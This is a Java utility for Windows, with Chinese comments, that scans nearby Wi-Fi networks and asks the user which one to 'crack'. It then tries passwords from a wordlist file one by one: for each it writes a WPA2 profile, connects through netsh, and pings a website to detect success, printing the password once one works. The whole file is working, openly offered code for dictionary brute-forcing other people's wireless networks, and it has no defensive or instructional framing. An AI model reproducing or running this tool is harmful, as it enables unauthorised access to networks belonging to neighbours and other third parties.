package com.example.demo._wifi;

import org.springframework.util.FileCopyUtils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

/**
 * <p>
 * TODO
 * </P>
 *
 * @author hyosunghan
 * @since 2021-09-17
 */
public class WifiUtils {

    public static void main(String[] args) throws IOException {

        List<String> wifiList = WifiUtils.execute("netsh wlan show networks mode=bssid", "./");
        List<String> ssidList = getSsidList(wifiList);
        for (int i = 0; i < ssidList.size(); i++) {
            System.out.println((i+1)+"."+ssidList.get(i));
        }
        System.out.println("请输入要破解的wifi:");

        Scanner sca =new Scanner(System.in);
        sca.useDelimiter("\n");
        String ssid = sca.next();

        System.out.println("-----------您选择的wifi为【"+ssid+"】-------------");
        System.out.println("-----------开始破解-------------");

        String path = WifiUtils.class.getClassLoader().getResource("pwd.txt").getPath();
        BufferedReader reader = new BufferedReader(new FileReader(path));


        String pwd = null;
        int i = 0;
        while((pwd = reader.readLine()) != null){

            i++;

            System.out.println("开始连接："+i+" -->"+ssid+" - "+pwd);
            boolean success = connect(ssid, pwd);
            if(success){
                System.out.println("连接成功，"+ssid+"的密码为"+pwd);
                return;
            }
        }

    }

    /**
     * 连接wifi
     * @param ssid
     * @param wifiPwd
     */
    private static boolean connect(String ssid, String wifiPwd) {
        try {
            String hex = WifiUtils.str2HexStr(ssid);
            //生成wifi配置文件
            String wifiConf = WifiUtils.getWifiStr(ssid, hex,wifiPwd);
            File out = new File("./temp.xml");
            FileCopyUtils.copy(wifiConf.getBytes(), out);
            //添加配置文件
            printList(WifiUtils.execute("netsh wlan add profile filename=temp.xml","./"));;
            //连接wifi
            printList(WifiUtils.execute("netsh wlan connect name=\""+ssid+"\"","./"));;
            //测试网络，使用ping的方式检测网络，此处建议优化改其他效率更高的方式，暂停2000毫秒是因为连接WiFi需要时间，这个时间因环境而异
            WifiUtils.execute("ipconfig","./");
            Thread.sleep(2000);
            boolean success = ping();
            return success;

        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }

    /**
     * 获得ssidList
     * @param resultList 通过cmd命令查出来的附件WiFi
     * @return
     */
    private static List<String> getSsidList(List<String> resultList) {
        List<String> ssidList = new ArrayList<String>();
        //遍历result获得ssid
        for (String result : resultList) {
            if(result.startsWith("SSID")){
                String ssid = result.substring(result.indexOf(":")+2);
                ssidList.add(ssid);
            }
        }
        return ssidList;
    }

    /**
     * 打印list数据
     * @param resultList
     */
    private static void printList(List<String> resultList) {
        for (String result : resultList) {
            System.out.println(result);
        }
    }

    /**
     * ping 校验
     */
    private static boolean ping() {
        boolean pinged = false;
        String cmd = "ping www.baidu.com";
        List<String> result = WifiUtils.execute(cmd, "./");
//        printList(result);
        if (result != null && result.size() > 0) {
            for (String item : result) {
                if (item.contains("来自")) {
                    pinged = true;
                    break;
                }
            }
        }
        return pinged;
    }

    /**
     * 该方法封装了执行cmd的方法
     *
     * @param cmd CMD命令
     * @param filePath 需要在哪个目录下执行
     */
    public static List<String> execute(String cmd, String filePath) {
        Process process = null;
        List<String> result = new ArrayList<String>();
        try {
            if (filePath != null) {
                process = Runtime.getRuntime().exec(cmd, null, new File(filePath));
            } else {
                process = Runtime.getRuntime().exec(cmd);
            }
            BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "gbk"));
            String line = null;
            while ((line = bReader.readLine()) != null) {
                result.add(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return result;
    }

    /**
     * 字符串转换成为16进制(无需Unicode编码)
     * @param str
     * @return
     */
    public static String str2HexStr(String str) {
        char[] chars = "0123456789ABCDEF".toCharArray();
        StringBuilder sb = new StringBuilder("");
        byte[] bs = str.getBytes();
        int bit;
        for (int i = 0; i < bs.length; i++) {
            bit = (bs[i] & 0x0f0) >> 4;
            sb.append(chars[bit]);
            bit = bs[i] & 0x0f;
            sb.append(chars[bit]);
            // sb.append(' ');
        }
        return sb.toString().trim();
    }

    public static String getWifiStr(String WIFI_NAME, String hex, String WIFI_PASSWORD) {
        return "<?xml version=\"1.0\"?>\n" +
                "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
                "\t<name>"+WIFI_NAME+"</name>\n" +
                "\t<SSIDConfig>\n" +
                "\t\t<SSID>\n" +
                "\t\t\t<hex>"+hex+"</hex>\n" +
                "\t\t\t<name>"+WIFI_NAME+"</name>\n" +
                "\t\t</SSID>\n" +
                "\t</SSIDConfig>\n" +
                "\t<connectionType>ESS</connectionType>\n" +
                "\t<connectionMode>auto</connectionMode>\n" +
                "\t<MSM>\n" +
                "\t\t<security>\n" +
                "\t\t\t<authEncryption>\n" +
                "\t\t\t\t<authentication>WPA2PSK</authentication>\n" +
                "\t\t\t\t<encryption>AES</encryption>\n" +
                "\t\t\t\t<useOneX>false</useOneX>\n" +
                "\t\t\t</authEncryption>\n" +
                "\t\t\t<sharedKey>\n" +
                "\t\t\t\t<keyType>passPhrase</keyType>\n" +
                "\t\t\t\t<protected>false</protected>\n" +
                "\t\t\t\t<keyMaterial>"+WIFI_PASSWORD+"</keyMaterial>\n" +
                "\t\t\t</sharedKey>\n" +
                "\t\t</security>\n" +
                "\t</MSM>\n" +
                "\t<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\">\n" +
                "\t\t<enableRandomization>false</enableRandomization>\n" +
                "\t</MacRandomization>\n" +
                "</WLANProfile>\n";
    }
}
